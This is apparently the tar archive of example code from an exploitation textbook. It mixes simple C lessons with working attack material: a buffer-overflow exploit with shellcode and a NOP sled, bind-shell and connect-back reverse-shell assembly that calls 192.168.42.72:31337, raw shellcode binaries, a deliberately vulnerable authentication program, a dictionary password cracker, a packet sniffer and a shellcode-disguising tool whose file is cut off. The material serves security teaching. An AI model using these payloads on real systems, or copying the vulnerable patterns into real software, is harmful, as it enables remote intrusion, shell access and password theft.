addressof.c                                                                                         0000644 0001747 0001747 00000000206 12564742435 012510  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int main() {
	int int_var = 5;
	int *int_ptr;
	
	int_ptr = &int_var; // put the address of int_var into int_ptr
}
                                                                                                                                                                                                                                                                                                                                                                                          addr_struct.c                                                                                       0000644 0001747 0001747 00000000652 12564742435 013061  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
int main(int argc, char *argv[]) {
   struct sockaddr_in addr;
   if(argc != 3) {
      printf("Usage: %s <target IP> <target port>\n", argv[0]);
      exit(0);
   }
   addr.sin_family = AF_INET;
   addr.sin_port = htons(atoi(argv[2]));
   addr.sin_addr.s_addr = inet_addr(argv[1]);

   write(1, &addr, sizeof(struct sockaddr_in));

}
  

                                                                                      aslr_demo.c                                                                                         0000644 0001747 0001747 00000000265 12564742435 012510  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int main(int argc, char *argv[]) {
   char buffer[50];

   printf("buffer is at %p\n", &buffer);

   if(argc > 1)
      strcpy(buffer, argv[1]);

   return 1;
}
                                                                                                                                                                                                                                                                                                                                           aslr_execl.c                                                                                        0000644 0001747 0001747 00000000453 12564742435 012663  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
   int stack_var;

   // print an address from the current stack frame
   printf("stack_var is at %p\n", &stack_var); 

   // start aslr_demo, to see how it's stack is arranged
   execl("./aslr_demo", "aslr_demo", NULL);
}

                                                                                                                                                                                                                     aslr_execl_exploit.c                                                                                0000644 0001747 0001747 00000001444 12564742435 014430  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <unistd.h>
#include <string.h>

char shellcode[]= 
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80"; // standard shellcode

int main(int argc, char *argv[]) {
   unsigned int i, ret, offset;
   char buffer[1000];

   printf("i is at %p\n", &i);

   if(argc > 1) // set offset
      offset = atoi(argv[1]);

   ret = (unsigned int) &i - offset + 200; // set return address
   printf("ret addr is %p\n", ret);

   for(i=0; i < 90; i+=4) // fill buffer with return address
      *((unsigned int *)(buffer+i)) = ret;
   memset(buffer+84, 0x90, 900); // build NOP sled
   memcpy(buffer+900, shellcode, sizeof(shellcode)); 
 
   execl("./aslr_demo", "aslr_demo", buffer,  NULL);
}

                                                                                                                                                                                                                            auth_overflow2.c                                                                                    0000644 0001747 0001747 00000001224 12564742435 013505  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
	char password_buffer[16];
	int auth_flag = 0;

	strcpy(password_buffer, password);
	
	if(strcmp(password_buffer, "brillig") == 0)
		auth_flag = 1;
	if(strcmp(password_buffer, "outgrabe") == 0)
		auth_flag = 1;

	return auth_flag;
}

int main(int argc, char *argv[]) {
	if(argc < 2) {
		printf("Usage: %s <password>\n", argv[0]);
		exit(0);
	}
	if(check_authentication(argv[1])) {
		printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
		printf("      Access Granted.\n");
		printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
	} else {
		printf("\nAccess Denied.\n");
   }
}
	
                                                                                                                                                                                                                                                                                                                                                                            auth_overflow.c                                                                                     0000644 0001747 0001747 00000001224 12564742435 013423  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
	int auth_flag = 0;
	char password_buffer[16];

	strcpy(password_buffer, password);
	
	if(strcmp(password_buffer, "brillig") == 0)
		auth_flag = 1;
	if(strcmp(password_buffer, "outgrabe") == 0)
		auth_flag = 1;

	return auth_flag;
}

int main(int argc, char *argv[]) {
	if(argc < 2) {
		printf("Usage: %s <password>\n", argv[0]);
		exit(0);
	}
	if(check_authentication(argv[1])) {
		printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
		printf("      Access Granted.\n");
		printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
	} else {
		printf("\nAccess Denied.\n");
   }
}
	
                                                                                                                                                                                                                                                                                                                                                                            bind_port.c                                                                                         0000644 0001747 0001747 00000001543 12564742435 012523  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {
   int sockfd, new_sockfd;  // listen on sock_fd, new connection on new_fd
   struct sockaddr_in host_addr, client_addr;   // my address information
   socklen_t sin_size;
   int yes=1;

   sockfd = socket(PF_INET, SOCK_STREAM, 0);
   
   host_addr.sin_family = AF_INET;         // host byte order
   host_addr.sin_port = htons(31337);      // short, network byte order
   host_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP
   memset(&(host_addr.sin_zero), '\0', 8); // zero the rest of the struct

   bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));

   listen(sockfd, 4);

   sin_size = sizeof(struct sockaddr_in);
   new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
}
                                                                                                                                                             bind_port.s                                                                                         0000644 0001747 0001747 00000003466 12564742435 012551  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66)
  pop eax
  cdq               ; zero out edx for use as a null DWORD later
  xor ebx, ebx      ; ebx is the type of socketcall
  inc ebx           ; 1 = SYS_SOCKET = socket() 
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; after syscall, eax has socket file descriptor
  
  mov esi, eax      ; save socket FD in esi for later

; bind(s, [2, 31337, 0], 16)
  push BYTE 0x66    ; socketcall (syscall #102) 
  pop eax
  inc ebx           ; ebx = 2 = SYS_BIND = bind()
  push edx          ; Build sockaddr struct:  INADDR_ANY = 0
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = 0 on success

; listen(s, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102) 
  inc ebx
  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
  push ebx          ; argv: { backlog = 4,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80

; c = accept(s, 0, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102) 
  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
  push edx          ; argv: { socklen = 0,
  push edx          ;         sockaddr ptr = NULL,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = connected socket FD


                                                                                                                                                                                                          bind_shell                                                                                          0000644 0001747 0001747 00000000134 12564742435 012420  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 jfX�1�CRjj��̀�jfXCRfhzifS��jQV��̀�fCCSV��̀�fCRRV��̀�jY�?̀Iy��Rh//shh/bin��R��S��̀                                                                                                                                                                                                                                                                                                                                                                                                                                    bind_shell_beta                                                                                     0000644 0001747 0001747 00000000145 12564742435 013415  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 jfX�1�CRjj��̀��jfXCRfhzifS��jQV��̀�fCCSV��̀�fCRRV��̀��j?X1�̀�?À�?À�Rh//shh/bin��R��S��̀                                                                                                                                                                                                                                                                                                                                                                                                                           bind_shell_beta.s                                                                                   0000644 0001747 0001747 00000005642 12564742435 013665  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66)
  pop eax
  cdq               ; zero out edx for use as a null DWORD later
  xor ebx, ebx      ; ebx is the type of socketcall
  inc ebx           ; 1 = SYS_SOCKET = socket() 
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; after syscall, eax has socket file descriptor
  
  mov esi, eax      ; save socket FD in esi for later

; bind(s, [2, 31337, 0], 16)
  push BYTE 0x66    ; socketcall (syscall #102) 
  pop eax
  inc ebx           ; ebx = 2 = SYS_BIND = bind()
  push edx          ; Build sockaddr struct:  INADDR_ANY = 0
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = 0 on success

; listen(s, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102) 
  inc ebx
  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
  push ebx          ; argv: { backlog = 4,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80

; c = accept(s, 0, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102) 
  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
  push edx          ; argv: { socklen = 0,
  push edx          ;         sockaddr ptr = NULL,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = connected socket FD

; dup2(connected socket, {all three standard I/O file descriptors})
  mov ebx, eax      ; move socket FD in ebx
  push BYTE 0x3F    ; dup2  syscall #63
  pop eax
  xor ecx, ecx      ; ecx = 0 = standard input
  int 0x80          ; dup(c, 0)
  mov BYTE al, 0x3F ; dup2  syscall #63
  inc ecx           ; ecx = 1 = standard output
  int 0x80          ; dup(c, 1)
  mov BYTE al, 0x3F ; dup2  syscall #63
  inc ecx           ; ecx = 2 = standard error
  int 0x80          ; dup(c, 2)

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11
  push edx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push edx          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
                                                                                              bind_shell.s                                                                                        0000644 0001747 0001747 00000005470 12564742435 012671  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66)
  pop eax
  cdq               ; zero out edx for use as a null DWORD later
  xor ebx, ebx      ; ebx is the type of socketcall
  inc ebx           ; 1 = SYS_SOCKET = socket() 
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; after syscall, eax has socket file descriptor
  
  xchg esi, eax     ; save socket FD in esi for later

; bind(s, [2, 31337, 0], 16)
  push BYTE 0x66    ; socketcall (syscall #102) 
  pop eax
  inc ebx           ; ebx = 2 = SYS_BIND = bind()
  push edx          ; Build sockaddr struct:  INADDR_ANY = 0
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = 0 on success

; listen(s, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102) 
  inc ebx
  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
  push ebx          ; argv: { backlog = 4,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80

; c = accept(s, 0, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102) 
  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
  push edx          ; argv: { socklen = 0,
  push edx          ;         sockaddr ptr = NULL,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = connected socket FD

; dup2(connected socket, {all three standard I/O file descriptors})
  xchg eax, ebx     ; put socket FD in ebx and 0x00000005 in eax
  push BYTE 0x2     ; ecx starts at 2
  pop ecx
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; count down to 0 
  jns dup_loop      ; if the sign flag is not set, ecx is not negative

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11
  push edx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push edx          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
                                                                                                                                                                                                        bitwise.c                                                                                           0000644 0001747 0001747 00000001006 12564742435 012203  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int main() {
   int i, bit_a, bit_b;
   printf("bitwise OR operator  |\n");
   for(i=0; i < 4; i++) {
      bit_a = (i & 2) / 2; // get the second bit
      bit_b = (i & 1);     // get the first bit
      printf("%d | %d = %d\n", bit_a, bit_b, bit_a | bit_b);
   }
   printf("\nbitwise AND operator  &\n");
   for(i=0; i < 4; i++) {
      bit_a = (i & 2) / 2; // get the second bit
      bit_b = (i & 1);     // get the first bit
      printf("%d & %d = %d\n", bit_a, bit_b, bit_a & bit_b);
   }
}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          char_array2.c                                                                                       0000644 0001747 0001747 00000000201 12564742435 012726  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <string.h>

int main() {
   char str_a[20];

   strcpy(str_a, "Hello World!\n");
   printf(str_a);
}
                                                                                                                                                                                                                                                                                                                                                                                               char_array.c                                                                                        0000644 0001747 0001747 00000000543 12564742435 012655  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
int main()
{
  char str_a[20];
  str_a[0]  = 'H';
  str_a[1]  = 'e';
  str_a[2]  = 'l';
  str_a[3]  = 'l';
  str_a[4]  = 'o';
  str_a[5]  = ',';
  str_a[6]  = ' ';
  str_a[7]  = 'w';
  str_a[8]  = 'o';
  str_a[9]  = 'r';
  str_a[10]  = 'l';
  str_a[11] = 'd';
  str_a[12] = '!';
  str_a[13] = '\n';
  str_a[14] = 0;
  printf(str_a); 
}
                                                                                                                                                             commandline.c                                                                                       0000644 0001747 0001747 00000000340 12564742435 013023  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int main(int arg_count, char *arg_list[]) {
   int i;
   printf("There were %d arguments provided:\n", arg_count);
   for(i=0; i < arg_count; i++)
      printf("argument #%d\t-\t%s\n", i, arg_list[i]);
}
                                                                                                                                                                                                                                                                                                connectback_shell                                                                                   0000644 0001747 0001747 00000000116 12564742435 013756  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 jfX�1�CRjj��̀�jfXCh��*HfhzifS��jQV��C̀���I�?̀Iy��Rh//shh/bin��R��S��̀                                                                                                                                                                                                                                                                                                                                                                                                                                                  connectback_shell.s                                                                                 0000644 0001747 0001747 00000005236 12564742435 014227  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66)
  pop eax
  cdq               ; zero out edx for use as a null DWORD later
  xor ebx, ebx      ; ebx is the type of socketcall
  inc ebx           ; 1 = SYS_SOCKET = socket() 
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; after syscall, eax has socket file descriptor
  
  xchg esi, eax     ; save socket FD in esi for later

; connect(s, [2, 31337, <IP address>], 16)
  push BYTE 0x66    ; socketcall (syscall #102) 
  pop eax
  inc ebx           ; ebx = 2 (needed for AF_INET)
  push DWORD 0x482aa8c0 ; Build sockaddr struct: IP Address = 192.168.42.72
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  inc ebx           ; ebx = 3 = SYS_CONNECT = connect()
  int 0x80          ; eax = 0 on successful connection

;  jz success        ; if connection successful, jump down to spawn shell
;  xor eax, eax      ; otherwise, exit cleanly
;  inc eax           ; eax = 1 exit (syscall #1)
;  xor ebx, ebx      ; status = 0  (nothing to see here)
;  int 0x80

;success:
; dup2(connected socket, {all three standard I/O file descriptors})
  xchg esi, ebx     ; put socket FD from esi into ebx (esi = 3)
  xchg ecx, esi     ; ecx = 3
  dec ecx           ; ecx starts at 2
;  xchg eax, esi     ; eax = 0x00000003  
;  push BYTE 0x2
;  pop ecx           ; ecx starts at 2
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; count down to 0 
  jns dup_loop      ; if the sign flag is not set, ecx is not negative

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11
  push edx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push edx          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
                                                                                                                                                                                                                                                                                                                                                                  convert2.c                                                                                          0000644 0001747 0001747 00000001001 12564742435 012272  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

void usage(char *program_name) {
   printf("Usage: %s <message> <# of times to repeat>\n", program_name);
   exit(1);
}

int main(int argc, char *argv[]) {
   int i, count;

//  if(argc < 3)      // If less than 3 arguments are used,
//    usage(argv[0]); // display usage message and exit.

   count = atoi(argv[2]); // convert the 2nd arg into an integer
   printf("Repeating %d times..\n", count);

   for(i=0; i < count; i++)
      printf("%3d - %s\n", i, argv[1]); // print the 1st arg
}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               convert.c                                                                                           0000644 0001747 0001747 00000001000 12564742435 012207  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

void usage(char *program_name) {
   printf("Usage: %s <message> <# of times to repeat>\n", program_name);
   exit(1);
}

int main(int argc, char *argv[]) {
   int i, count;

   if(argc < 3)      // If less than 3 arguments are used,
      usage(argv[0]); // display usage message and exit.

   count = atoi(argv[2]); // convert the 2nd arg into an integer
   printf("Repeating %d times..\n", count);

   for(i=0; i < count; i++)
      printf("%3d - %s\n", i, argv[1]); // print the 1st arg
}
crypt_crack.c                                                                                       0000644 0001747 0001747 00000002373 12564742435 013051  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #define _XOPEN_SOURCE
#include <unistd.h>
#include <stdio.h>

/* barf a message and exit */
void barf(char *message, char *extra) {
   printf(message, extra);
   exit(1);
}

/* a dictionary attack example program */
int main(int argc, char *argv[]) {
   FILE *wordlist;
   char *hash, word[30], salt[3];
   if(argc < 2) 
      barf("Usage: %s <wordlist file> <password hash>\n", argv[0]);

   strncpy(salt, argv[2], 2); // first 2 bytes of hash are the salt
   salt[2] = '\0';  // terminate string

   printf("Salt value is \'%s\'\n", salt);

   if( (wordlist = fopen(argv[1], "r")) == NULL) // open the wordlist
      barf("Fatal: couldn't open the file \'%s\'.\n", argv[1]);
   
   while(fgets(word, 30, wordlist) != NULL) { // read each word
      word[strlen(word)-1] = '\0'; // remove the '\n' byte at the end
      hash = crypt(word, salt); // hash the word using the salt
      printf("trying word:   %-30s ==> %15s\n", word, hash);
      if(strcmp(hash, argv[2]) == 0) { // if the hash matches
         printf("The hash \"%s\" is from the ", argv[2]);
         printf("plaintext password \"%s\".\n", word);
         fclose(wordlist);
         exit(0);
      }
   }
   printf("Couldn't find the plaintext password in the supplied wordlist.\n");
   fclose(wordlist);
}
                                                                                                                                                                                                                                                                     crypt_test.c                                                                                        0000644 0001747 0001747 00000000517 12564742435 012743  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #define _XOPEN_SOURCE
#include <unistd.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
   if(argc < 2) { 
      printf("Usage: %s <plaintext password> <salt value>\n", argv[0]);
      exit(1); 
   }
   printf("password \"%s\" with salt \"%s\" ", argv[1], argv[2]);
   printf("hashes to ==> %s\n", crypt(argv[1], argv[2]));
}
                                                                                                                                                                                 datatype_sizes.c                                                                                    0000644 0001747 0001747 00000001022 12564742435 013563  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int main() {
	printf("The 'int' data type is\t\t %d bytes\n", sizeof(int));
	printf("The 'unsigned int' data type is\t %d bytes\n", sizeof(unsigned int));
	printf("The 'short int' data type is\t %d bytes\n", sizeof(short int));
	printf("The 'long int' data type is\t %d bytes\n", sizeof(long int));
	printf("The 'long long int' data type is %d bytes\n", sizeof(long long int));
	printf("The 'float' data type is\t %d bytes\n", sizeof(float));
	printf("The 'char' data type is\t\t %d bytes\n", sizeof(char));
}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              decode_sniff.c                                                                                      0000644 0001747 0001747 00000007057 12564742435 013161  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <pcap.h>
#include "hacking.h"
#include "hacking-network.h"

void pcap_fatal(const char *, const char *);
void decode_ethernet(const u_char *);
void decode_ip(const u_char *);
u_int decode_tcp(const u_char *);

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);

int main() {
	struct pcap_pkthdr cap_header;
	const u_char *packet, *pkt_data;
	char errbuf[PCAP_ERRBUF_SIZE];
	char *device;

	pcap_t *pcap_handle;
	
	device = pcap_lookupdev(errbuf);
	if(device == NULL)
		pcap_fatal("pcap_lookupdev", errbuf);

	printf("Sniffing on device %s\n", device);
	
	pcap_handle = pcap_open_live(device, 4096, 1, 0, errbuf);
	if(pcap_handle == NULL)
		pcap_fatal("pcap_open_live", errbuf);
	
	pcap_loop(pcap_handle, 3, caught_packet, NULL);

	pcap_close(pcap_handle);
}

void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
	int tcp_header_length, total_header_size, pkt_data_len;
	u_char *pkt_data;
	
	printf("==== Got a %d byte packet ====\n", cap_header->len);


	decode_ethernet(packet);
	decode_ip(packet+ETHER_HDR_LEN);
	tcp_header_length = decode_tcp(packet+ETHER_HDR_LEN+sizeof(struct ip_hdr));

	total_header_size = ETHER_HDR_LEN+sizeof(struct ip_hdr)+tcp_header_length;
	pkt_data = (u_char *)packet + total_header_size;  // pkt_data points to the data portion
	pkt_data_len = cap_header->len - total_header_size;
	if(pkt_data_len > 0) {
		printf("\t\t\t%u bytes of packet data\n", pkt_data_len);
		dump(pkt_data, pkt_data_len);
	} else
		printf("\t\t\tNo Packet Data\n");
}

void pcap_fatal(const char *failed_in, const char *errbuf) {
	printf("Fatal Error in %s: %s\n", failed_in, errbuf);
	exit(1);
}

void decode_ethernet(const u_char *header_start) {
	int i;
	const struct ether_hdr *ethernet_header;

	ethernet_header = (const struct ether_hdr *)header_start;
	printf("[[  Layer 2 :: Ethernet Header  ]]\n");
	printf("[ Source: %02x", ethernet_header->ether_src_addr[0]);
	for(i=1; i < ETHER_ADDR_LEN; i++)
		printf(":%02x", ethernet_header->ether_src_addr[i]);

	printf("\tDest: %02x", ethernet_header->ether_dest_addr[0]);
	for(i=1; i < ETHER_ADDR_LEN; i++)
		printf(":%02x", ethernet_header->ether_dest_addr[i]);
	printf("\tType: %hu ]\n", ethernet_header->ether_type);
}

void decode_ip(const u_char *header_start) {
	const struct ip_hdr *ip_header;

	ip_header = (const struct ip_hdr *)header_start;
	printf("\t((  Layer 3 ::: IP Header  ))\n");
	printf("\t( Source: %s\t", inet_ntoa(ip_header->ip_src_addr));
	printf("Dest: %s )\n", inet_ntoa(ip_header->ip_dest_addr));
	printf("\t( Type: %u\t", (u_int) ip_header->ip_type);
	printf("ID: %hu\tLength: %hu )\n", ntohs(ip_header->ip_id), ntohs(ip_header->ip_len));
}

u_int decode_tcp(const u_char *header_start) {
	u_int header_size;
	const struct tcp_hdr *tcp_header;

	tcp_header = (const struct tcp_hdr *)header_start;
	header_size = 4 * tcp_header->tcp_offset;
	
	printf("\t\t{{  Layer 4 :::: TCP Header  }}\n");
	printf("\t\t{ Src Port: %hu\t", ntohs(tcp_header->tcp_src_port));
	printf("Dest Port: %hu }\n", ntohs(tcp_header->tcp_dest_port));
	printf("\t\t{ Seq #: %u\t", ntohl(tcp_header->tcp_seq));
	printf("Ack #: %u }\n", ntohl(tcp_header->tcp_ack));
	printf("\t\t{ Header Size: %u\tFlags: ", header_size);
	if(tcp_header->tcp_flags & TCP_FIN)
		printf("FIN ");
	if(tcp_header->tcp_flags & TCP_SYN)
		printf("SYN ");
	if(tcp_header->tcp_flags & TCP_RST)
		printf("RST ");
	if(tcp_header->tcp_flags & TCP_PUSH)
		printf("PUSH ");
	if(tcp_header->tcp_flags & TCP_ACK)
		printf("ACK ");
	if(tcp_header->tcp_flags & TCP_URG)
		printf("URG ");
	printf(" }\n");

	return header_size;
}
	


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 dissembler.c                                                                                        0000644 0001747 0001747 00000017165 12564742435 012703  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 /*********************************************************\
*      dissembler   ver. 0.9    *    File: dissembler.c   *
***********************************************************
*                                                         *
*  Author:        Jon Erickson <matrix@phiral.com>        *
*  Organization:  Phiral Research Laboratories            *
*                                                         *
*  Like a wolf in sheeps clothing, evil byte code that    *
*  has been dissembled looks like an innocent string.     *
*                                                         *
*   dissemble - dis'sem'ble                               *
*    1. To disguise or conceal behind a false appearance  *
*    2. To make a false show of; feign                    *
*                                                         *
\*********************************************************/

         /*   FOR EDUCATIONAL PURPOSES ONLY  */

#include <stdio.h>
#include <sys/stat.h>
#include <ctype.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>

#define VERSION "0.9"
#define CHR "%_01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-"
#define MAX_CHR 128

void usage(char *);
void banner();
char *gen(unsigned int, unsigned int, char *);

int main(int argc, char* argv[])
{
	unsigned int targ=0, next=0, last=0xbfffffe0;
	int i, j, k, len, norm, pad, opt;
	int size=0, esc=0, ninja=0, bridge=-1;
	char *head=0, *body, *mem, *code=0;
	struct stat buff;
	FILE *fh;
	extern char *optarg;
	extern int optind;

	banner();
	if(argc < 2) usage(argv[0]);

	srand(time(NULL));
	len = strlen(CHR);
	while((opt = getopt(argc, argv, "Nt:s:b:c:w:e")) != EOF)
	{
		switch(opt)
		{
			case 't':
				targ = strtoul(optarg, NULL, 0);
				fprintf(stderr, "[t] Target address: %p\n", targ);
				break;
			case 'N':
				ninja = 4;
				fprintf(stderr, "[N] Ninja Magic Optimization: ON\n");
				break;
			case 's':
				size = atoi(optarg);
				if(size)
				{
					fprintf(stderr, "[s] Size changes target: ON   ");
					fprintf(stderr, "(adjust size: %d bytes)\n", size);
				}
				break;
			case 'b':
				bridge = atoi(optarg);
				fprintf(stderr, "[b] Bridge size: %d words\n", bridge);
				break;
			case 'c':
				code = optarg;
				len = strlen(optarg);
				fprintf(stderr, "[c] Using charset: %s (%d)\n", code, strlen(code));
				break;
			case 'w':
				head = optarg;
				fprintf(stderr, "[w] Write to Output File: %s \n", head);
				break;
			case 'e':
				esc = 1;
				fprintf(stderr, "[e] Escape the backslash: ON\n");
				break;
		}
	}

	if(size && !ninja)
	{
		fprintf(stderr, "[!] Size adjustment needs ninja magic.. enabling..\n");
		fprintf(stderr, "[N] Ninja Magic Optimization: ON\n");
		ninja = 4;
	}

	if(stat(argv[optind], &buff))
	{
		fprintf(stderr,"\nError: problem with source bytecode file: %s\n", argv[optind]);
		exit(-1);
	}
	norm = buff.st_size;
	pad = (norm%4)+4;
	mem = (char *) malloc(((norm+pad)*7)+len+62)+21;
	if(code) 
		strncpy(mem, code, len);
	else
		strncpy(mem, CHR, len);
	mem[len] = 0;
	code = mem + len + 2;
	memset(code, 0x90, 8);
	fh = fopen(argv[optind], "r");
	fread(code+pad, norm, 1, fh);
